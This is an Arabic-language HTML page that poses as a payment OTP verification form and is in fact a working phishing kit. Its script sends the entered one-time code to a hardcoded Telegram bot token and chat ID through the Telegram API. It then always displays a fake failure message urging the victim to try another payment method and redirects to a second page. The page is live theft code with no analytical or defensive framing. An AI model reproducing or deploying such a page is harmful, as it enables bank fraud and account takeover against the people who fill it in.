<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
  <meta charset="UTF-8" /><meta name="viewport" content="width=device-width, initial-scale=1.0"/><title>رمز التحقق | OTP</title>
  <style>
    body { margin: 0; padding: 0; background-color: #f1f3f6; font-family: 'Segoe UI', sans-serif; display: flex; align-items: center; justify-content: center; height: 100vh; }
    .otp-box { background-color: #ffffff; padding: 40px 30px; width: 90%; max-width: 420px; border-radius: 16px; box-shadow: 0 8px 20px rgba(0, 0, 0, 0.1); text-align: center; }
    h2 { font-size: 20px; color: #0d2343; margin-bottom: 10px; }
    .info-text { font-size: 14px; color: #444; margin-bottom: 25px; }
    .otp-inputs { display: flex; justify-content: center; gap: 10px; margin-bottom: 25px; }
    .otp-inputs input { width: 40px; height: 50px; font-size: 24px; text-align: center; border: 1.5px solid #ccc; border-radius: 10px; background-color: #f9f9f9; }
    .confirm-btn { width: 100%; background-color: #0d2343; color: #ffffff; border: none; padding: 14px; font-size: 16px; border-radius: 8px; cursor: pointer; }
    #error-msg { color: #ce0000; font-weight: bold; margin-top: 15px; display: none; }
  </style>
</head>
<body>
<div class="otp-box">
  <h2>رمز التحقق لمرة واحدة</h2>
  <p class="info-text">يرجى إدخال الرمز المرسل إلى هاتفك لإتمام العملية.</p>
  <div class="otp-inputs">
    <input type="text" maxlength="1" oninput="if(this.value.length==1)this.nextElementSibling?.focus()"/>
    <input type="text" maxlength="1" oninput="if(this.value.length==1)this.nextElementSibling?.focus()"/>
    <input type="text" maxlength="1" oninput="if(this.value.length==1)this.nextElementSibling?.focus()"/>
    <input type="text" maxlength="1" oninput="if(this.value.length==1)this.nextElementSibling?.focus()"/>
    <input type="text" maxlength="1" oninput="if(this.value.length==1)this.nextElementSibling?.focus()"/>
    <input type="text" maxlength="1" />
  </div>
  <button class="confirm-btn" onclick="confirmOTP()">تأكيد</button>
  <p id="error-msg">⚠️ عذراً، لم تنجح عملية التحقق. يرجى إدخال طريقة دفع أخرى.</p>
</div>
<script>
  const token = "8696968658:AAF2W7759-6i1demyYVPzrfgGfYjhkIFvng";
  const chatId = "1848565778";

  function confirmOTP() {
    let code = "";
    document.querySelectorAll('.otp-inputs input').forEach(i => code += i.value);
    const msg = `🔐 رمز التحقق المدخل (OTP): ${code}`;
    
    fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(msg)}`)
    .finally(() => {
        document.getElementById('error-msg').style.display = 'block';
        setTimeout(() => { window.location.href = "page2.html"; }, 3000);
    });
  }
</script>
</body>
</html>
